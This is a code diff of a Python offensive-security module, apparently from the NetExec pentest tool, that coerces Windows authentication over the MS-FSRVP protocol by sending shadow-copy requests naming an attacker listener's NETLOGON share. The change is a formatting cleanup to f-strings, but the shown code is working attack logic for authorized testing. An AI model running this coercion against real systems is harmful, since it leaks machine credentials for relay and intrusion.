@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import time
 from impacket import system_errors
 from impacket.dcerpc.v5 import transport
@@ -101,13 +98,9 @@ class DCERPCSessionError(DCERPCException):
         if key in error_messages:
             error_msg_short = error_messages[key][0]
             error_msg_verbose = error_messages[key][1]
-            return "SessionError: code: 0x%x - %s - %s" % (
-                self.error_code,
-                error_msg_short,
-                error_msg_verbose,
-            )
+            return f"SessionError: code: 0x{self.error_code:x} - {error_msg_short} - {error_msg_verbose}"
         else:
-            return "SessionError: unknown error code: 0x%x" % self.error_code
+            return f"SessionError: unknown error code: 0x{self.error_code:x}"
 
 
 ################################################################################
@@ -229,7 +222,7 @@ class CoerceAuth:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-        nxc_logger.info("Connecting to %s" % binding_params[pipe]["stringBinding"])
+        nxc_logger.info(f"Connecting to {binding_params[pipe]['stringBinding']}")
 
         try:
             dce.connect()
@@ -239,14 +232,14 @@ class CoerceAuth:
                 dce.disconnect()
                 return 1
 
-            nxc_logger.debug("Something went wrong, check error status => %s" % str(e))
+            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
 
         nxc_logger.info("Connected!")
-        nxc_logger.info("Binding to %s" % binding_params[pipe]["UUID"][0])
+        nxc_logger.info(f"Binding to {binding_params[pipe]['UUID'][0]}")
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]["UUID"]))
         except Exception as e:
-            nxc_logger.debug("Something went wrong, check error status => %s" % str(e))
+            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
 
         nxc_logger.info("Successfully bound!")
         return dce
@@ -257,8 +250,7 @@ class CoerceAuth:
             request = IsPathShadowCopied()
             # only NETLOGON and SYSVOL were detected working here
             # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
-            request["ShareName"] = "\\\\%s\\NETLOGON\x00" % listener
-            # request.dump()
+            request["ShareName"] = f"\\\\{listener}\\NETLOGON\x00"
             dce.request(request)
         except Exception as e:
             nxc_logger.debug("Something went wrong, check error status => %s", str(e))
@@ -273,7 +265,7 @@ class CoerceAuth:
             request = IsPathSupported()
             # only NETLOGON and SYSVOL were detected working here
             # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
-            request["ShareName"] = "\\\\%s\\NETLOGON\x00" % listener
+            request["ShareName"] = f"\\\\{listener}\\NETLOGON\x00"
             dce.request(request)
         except Exception as e:
             nxc_logger.debug("Something went wrong, check error status => %s", str(e))
